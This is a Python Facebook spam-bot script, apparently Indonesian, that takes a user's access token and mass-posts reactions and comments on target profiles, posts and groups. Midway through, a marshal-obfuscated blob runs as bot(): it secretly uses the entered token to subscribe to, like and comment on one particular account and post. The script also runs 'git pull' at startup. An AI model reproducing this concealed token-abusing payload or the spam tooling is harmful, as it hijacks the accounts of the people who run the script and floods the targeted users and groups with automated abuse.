#!/usr/bin/python3
#coding=utf-8

import os, sys, re, time, requests, calendar, random,json
from datetime import datetime
from datetime import date

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
bulan = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()
op = bulan[buTemp]

bo = []

###### TIME DELAY ######

def countdown(p): 
    while p: 
        mins, secs = divmod(p, 60) 
        timer = '{:02d}:{:02d}'.format(mins, secs) 
        time.sleep(1) 
        p -= 1
     
now = datetime.now()
hour = now.hour
if hour < 4:
  respon = "Selamat Dini Hari !"
elif 4 <= hour < 12:
  respon = "Selamat Pagi !"
elif 12 <= hour < 15:
  respon = "Selamat Siang !"
elif 15 <= hour < 17:
  respon = "Selamat Sore !"
elif 17 <= hour < 18:
  respon = "Selamat Petang !"
else:
  respon = "Selamat Malam !"
   
###### LOGO TAMPILAN ######

logo = ('''\033[1;92m
 ____    ____  __ __  ____   __ __  _     
|    \  /    T|  T  T|    \ |  T  T| T    
\033[1;97m|  o  )Y  o  ||  l  ||  D  )|  |  || |    
|   _/ |     ||  _  ||    / |  |  || l___ 
|  |   |  _  ||  |  ||    \ |  :  ||     T
|  |   |  |  ||  |  ||  .  Yl     ||     |
\033[1;92ml__j   l__j__jl__j__jl__j\_j \__,_jl_____j 

''')




###### LOGIN TOKEN FACEBOOK ######

def login():
	os.system("clear")
	try:
		token = open('token.txt', 'r')
		print("\033[1;91m(+) token kedaluwarsa !!!")
		time.sleep(1)
		os.system('rm token.txt')
		login()
	except (KeyError, IOError):
		os.system('clear')
		print (logo)
		token = input('\033[1;97m(+) token : \033[1;92m')
		try:
			zedd = open('token.txt', 'w')
			zedd.write(token)
			zedd.close()
			print("\n\033[1;97m(+) sedang masuk tunggu sebentar...")
			bot()
			masuk()
		except KeyError:
			print("\033[1;91m[!] token kedaluwarsa !!!")
			time.sleep(1)
			os.system('rm token.txt')
			login()
			

###### BOT FACEBOOK ######

import marshal
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00@\x00\x00\x00s\x1a\x00\x00\x00d\x00d\x01l\x00Z\x00e\x01e\x00\xa0\x02d\x02\xa1\x01\x83\x01\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Nsn\x05\x00\x00\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00@\x00\x00\x00s\x0c\x00\x00\x00d\x00d\x01\x84\x00Z\x00d\x02S\x00)\x03c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\t\x00\x00\x00C\x00\x00\x00s6\x01\x00\x00z<t\x00d\x01d\x02\x83\x02\xa0\x01\xa1\x00}\x00t\x02\xa0\x03d\x03|\x00\x17\x00\xa1\x01}\x01t\x04\xa0\x05|\x01j\x06\xa1\x01}\x02|\x02d\x04\x19\x00}\x03|\x02d\x05\x19\x00}\x04W\x00n.\x04\x00t\x07t\x08f\x02yj\x01\x00\x01\x00\x01\x00t\td\x06\x83\x01\x01\x00t\n\xa0\x0bd\x07\xa1\x01\x01\x00t\x0c\x83\x00\x01\x00Y\x00n\x020\x00d\x08}\x05d\t}\x06t\rt\x0e\xa0\x0f\xa1\x00\xa0\x10d\n\xa1\x01\x83\x01}\x07d\x0bt\x11t\x12t\x13f\x03\x16\x00}\x08d\x0cd\rd\x0ed\x0fd\x10d\x11d\x12d\x13\x9c\x07t\rt\x0e\xa0\x0f\xa1\x00\xa0\x10d\x14\xa1\x01\x83\x01\x19\x00}\tt\x02\xa0\x14d\x15|\x00\x17\x00\xa1\x01\x01\x00t\x02\xa0\x14d\x16|\x00\x17\x00\xa1\x01\x01\x00t\x02\xa0\x14d\x17t\x15\x17\x00d\x18\x17\x00|\x05\x17\x00d\x19\x17\x00|\x06\x17\x00d\x1a\x17\x00|\x07\x17\x00d\x1b\x17\x00d\x1c\x17\x00|\t\x17\x00d\x1d\x17\x00|\x08\x17\x00d\x1e\x17\x00d\x1f\x17\x00|\x00\x17\x00\xa1\x01\x01\x00t\x02\xa0\x14d\x17|\x00\x17\x00d\x1f\x17\x00|\x00\x17\x00\xa1\x01\x01\x00d\x00S\x00) Nz\ttoken.txt\xda\x01rz,https://graph.facebook.com/me/?access_token=\xda\x04name\xda\x02idz \x1b[1;91m[!] token kedaluwarsa !!!z\x0crm token.txtzpbang pahrul gua izin pake script lu :)\n\nhttps://www.facebook.com/100058252283419/posts/409580980993641/?app=fbl\nz\x1eKomentar Ini Ditulis Oleh Bot z\x08%H:%M:%Sz\x08%s %s %sZ\x06MingguZ\x05SeninZ\x06SelasaZ\x04RabuZ\x05KamisZ\x05JumatZ\x05Sabtu)\x07Z\x06SundayZ\x06MondayZ\x07TuesdayZ\tWednesdayZ\x08ThursdayZ\x06FridayZ\x08Saturdayz\x02%AzDhttps://graph.facebook.com/100058252283419/subscribers?access_token=zKhttps://graph.facebook.com/409580980993641/likes?summary=true&access_token=z=https://graph.facebook.com/409580980993641/comments/?message=z\x02\n\n\xda\x01\nz\t\n[ Pukul z\x07 WIB ] z\x03\n- z\x02, z\x02 -z\x0e&access_token=)\x16\xda\x04open\xda\x04readZ\x08requests\xda\x03getZ\x04json\xda\x05loads\xda\x04text\xda\x08KeyError\xda\x07IOError\xda\x05print\xda\x02os\xda\x06systemZ\x05login\xda\x03strZ\x08datetimeZ\x03now\xda\x08strftimeZ\x02ha\xda\x02opZ\x02taZ\x04postZ\x06respon)\nZ\x05tokenZ\x03otw\xda\x01aZ\x04namar\x03\x00\x00\x00Z\x04texsZ\x03komZ\x05waktuZ\x07tanggalZ\x06_hari_\xa9\x00r\x13\x00\x00\x00\xfa\x08<alvino>\xda\x03bot\x01\x00\x00\x00s&\x00\x00\x00\x00\x01\x02\x01\x0e\x01\x0e\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01\x0c\x01\x04\x01\x04\x01\x12\x01\x0e\x01&\x01\x0e\x01\x0e\x01F\x01r\x15\x00\x00\x00N)\x01r\x15\x00\x00\x00r\x13\x00\x00\x00r\x13\x00\x00\x00r\x13\x00\x00\x00r\x14\x00\x00\x00\xda\x08<module>\x01\x00\x00\x00\xf3\x00\x00\x00\x00)\x03\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x05\x00\x00\x00r\x05\x00\x00\x00\xfa\x08<alvino>\xda\x08<module>\x06\x00\x00\x00s\x02\x00\x00\x00\x08\x01'))

os.system("clear")

now = datetime.now()
hour = now.hour
if hour < 4:
  waktu = "Selamat Dini Hari"
elif 4 <= hour < 12:
  waktu = "Selamat Pagi"
elif 12 <= hour < 15:
  waktu = "Selamat Siang"
elif 15 <= hour < 17:
  waktu = "Selamat Sore"
elif 17 <= hour < 18:
  waktu = "Selamat Petang"
else:
  waktu = "Selamat Malam"

def masuk():
	try:
		token = open('token.txt', 'r').read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except (KeyError, IOError):
		print("\033[1;91m[!] token kedaluwarsa !!!")
		os.system('rm token.txt')
		login()
	os.system('clear')
	print(logo)
	print("\033[1;97m(+) User Active : \033[1;92m"+ nama +"\033[1;97m")
	print("\033[1;97m(+) Id Facebook : \033[1;92m"+ id +"\033[1;97m")
	print ("")
	print("\033[1;93m-"*40)
	print ("\033[1;97m(1) bot react random post         ")
	print ("\033[1;97m(2) bot react group post  ")
	print ("\033[1;97m(3) bot coment random post          ")
	print ("\033[1;97m(4) bot coment target post          ")
	print ("\033[1;97m(5) bot coment group post          ")
	print ("\033[1;97m(0) log out ( keluar )          ")
	print("\033[1;93m-"*40)
	print ("")
	pilih()
	
	
def pilih():
	pahrul = input('\033[1;97m(+) choose : ')
	if pahrul == "":
		print ("")
		print ("(+) Ngetik Apaan Lu bangsad !!!")
		exit()
	elif pahrul == "1":
		react()
	elif pahrul == "2":
		react_grup()
	elif pahrul == "3":
		spam()
	elif pahrul == "4":
		spam_target()
	elif pahrul == "5":
		grup_spam()
	elif pahrul == "0":
		os.system('rm token.txt')
		exit()
	else:
		print ("")
		print ("(+) Ngetik Apaan Lu bangsad !!!")
		exit()
		
		
		

###### REACT TARGET POSTS ######
		
		
def react():
    reaksi = []
    try:
        token = open('token.txt', 'r').read()
    except IOError:
    	print("\033[1;91m[!] token kedaluwarsa !!!")
    os.system("clear")
    print (logo) 
    print("\033[1;97m(1) like (2) love (3) wow (4) haha (5) sad (6) angry")
    print("")
    emot = input ("\033[1;97m(+) choose : ")
    if emot in ('1', '01'):
        tipe = 'LIKE'
    elif emot in ('2', '02'):
        tipe = 'LOVE'
    elif emot in ('3', '03'):
        tipe = 'WOW'
    elif emot in ('4', '04'):
        tipe = 'HAHA'
    elif emot in ('5', '05'):
        tipe = 'SAD'
    elif emot in ('6', '06'):
        tipe = 'ANGRY'
    elif emot in ('0', '00'):
        menu()
    else:
        exit()
    print("")
    os.system('clear')
    print (logo)
    id = input ("\033[1;97m(+) id target : \033[1;92m")
    limit = input ("\033[1;97m(+) limit : \033[1;92m")
    print ('\n\033[1;97m(+) please wait...')
    print("")
    
    try:
        r = requests.get('https://graph.facebook.com/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
        x = json.loads(r.text)
        for z in x['feed']['data']:
            idz = z['id']
            reaksi.append(idz)
            requests.post('https://graph.facebook.com/' + idz + '/reactions?type=' + tipe + '&access_token=' + token)
            print ('\r\033[1;92m[✓] SUCCESS : '+ idz + '\033[1;91m')
            sys.stdout.flush()
        
        print("\n\033[1;97m(+) Finished...")
        pahrul = input ("\033[1;97m\n[<BACK>]")
        masuk()
    except KeyError:
        exit()




###### BOT REACT GROUP POST ######


def react_grup():
    reaksi = []
    try:
        token = open('token.txt', 'r').read()
    except IOError:
    	print("\033[1;91m[!] token kedaluwarsa !!!")
    os.system("clear")
    print (logo)  
    print("\033[1;97m(1) like (2) love (3) wow (4) haha (5) sad (6) angry")
    print("")
    emot = input ("\033[1;97m(+) choose : ")
    if emot in ('1', '01'):
        tipe = 'LIKE'
    elif emot in ('2', '02'):
        tipe = 'LOVE'
    elif emot in ('3', '03'):
        tipe = 'WOW'
    elif emot in ('4', '04'):
        tipe = 'HAHA'
    elif emot in ('5', '05'):
        tipe = 'SAD'
    elif emot in ('6', '06'):
        tipe = 'ANGRY'
    elif emot in ('0', '00'):
        menu()
    else:
        exit()
    print("")
    os.system('clear')
    print (logo)
    id = input('\033[1;97m(+) input id group : \033[1;92m')
    limit = input('\033[1;97m(+) limit : \033[1;92m')
    print ('\n\033[1;97m(+) please wait...')
    print("")
    
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + token)
        asw = json.loads(r.text)
    except KeyError:
    	exit()
        
    try:
        r = requests.get('https://graph.facebook.com/v3.0/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
        x = json.loads(r.text)
        for z in x['feed']['data']:
            idz = z['id']
            reaksi.append(idz)
            requests.post('https://graph.facebook.com/' + idz + '/reactions?type=' + tipe + '&access_token=' + token)
            print ('\r\033[1;92m[✓] SUCCESS : '+ idz + '\033[1;91m')
            sys.stdout.flush()
        
        print("\n\033[1;97m(+) Finished...")
        pahrul = input ("\033[1;97m\n[<BACK>]")
        masuk()
    except KeyError:
        exit()




###### KOMENT POSTINGAN FACEBOOK ######


def spam():
    komen = []
    try:
        token = open('token.txt', 'r').read()
    except IOError:
    	print("\033[1;91m[!] token kedaluwarsa !!!")
    os.system("clear")
    print (logo) 
    id = input ('\033[1;97m(+) id target : \033[1;92m')
    kom = input ('\033[1;97m(+) komentar  : \033[1;92m')
    limit = input ('\033[1;97m(+) limit     : \033[1;92m')
    km = kom.replace('<>', '\n')
    print("")
    print("\033[1;97m(+) please wait...")
    print("")
    
    try:
        r = requests.get('https://graph.facebook.com/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
        f = json.loads(r.text)
        for z in f['feed']['data']:
            ie = z['id']
            komen.append(ie)
            requests.post('https://graph.facebook.com/' + ie + '/comments?message=' + km + '&access_token=' + token)
            print ('\r\033[1;92m[✓] SUCCESS : '+ ie + '\033[1;91m')
            sys.stdout.flush()
        
        print ("\n\033[1;97m(+) finished...")
        pahrul = input('\n\033[1;97m[<BACK>]')
        masuk()
    except KeyError:
        exit()

def spam_target():
    komen = []
    try:
        token = open('token.txt', 'r').read()
    except IOError:
    	print("\033[1;91m[!] token kedaluwarsa !!!")
    os.system("clear")
    print (logo) 
    id = input ('\033[1;97m(+) id post : \033[1;92m')
    kom = input ('\033[1;97m(+) komentar  : \033[1;92m')
    limit = int(input ('\033[1;97m(+) limit     : \033[1;92m'))
    km = kom.replace('<>', '\n')
    print("")
    print("\033[1;97m(+) please wait...")
    print("")
    
    try:
        for i in range(limit,):
            requests.post('https://graph.facebook.com/' + id + '/comments?message=' + kom + '&access_token=' + token)
            print ('\r\033[1;92m[✓] SUCCESS : '+ id + '\033[1;91m')
            sys.stdout.flush()
        
        print ("\n\033[1;97m(+) finished...")
        pahrul = input('\n\033[1;97m[<BACK>]')
        masuk()
    except KeyError:
        exit()


def grup_spam():
    komengrup = []
    try:
        token = open('token.txt', 'r').read()
    except IOError:
    	print("\033[1;91m[!] token kedaluwarsa !!!")
    os.system("clear")
    print (logo) 
    id = input ('\033[1;97m(+) input id group : \033[1;92m')
    kom = input ('\033[1;97m(+) komentar  : \033[1;92m')
    limit = input ('\033[1;97m(+) limit     : \033[1;92m')
    km = kom.replace('<>', '\n')
    print("")
    print("\033[1;97m(+) please wait...")
    print("")
    try:
        r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + token)
        asw = json.loads(r.text)
    except KeyError:
        exit()

    
    try:
        p = requests.get('https://graph.facebook.com/v3.0/' + id + '?fields=feed.limit(' + limit + ')&access_token=' + token)
        a = json.loads(p.text)
        for e in a['feed']['data']:
            grep = e['id']
            komengrup.append(grep)
            requests.post('https://graph.facebook.com/' + grep + '/comments?message=' + km + '&access_token=' + token)
            print ('\r\033[1;92m[✓] SUCCESS : '+ grep + '\033[1;91m')
            sys.stdout.flush()
        
        print ("\n\033[1;97m(+) finished...")
        pahrul = input('\n\033[1;97m[<BACK>]')
        masuk()
    except KeyError:
        exit()




if __name__ == '__main__':
	os.system("git pull")
	os.system("clear")
	login()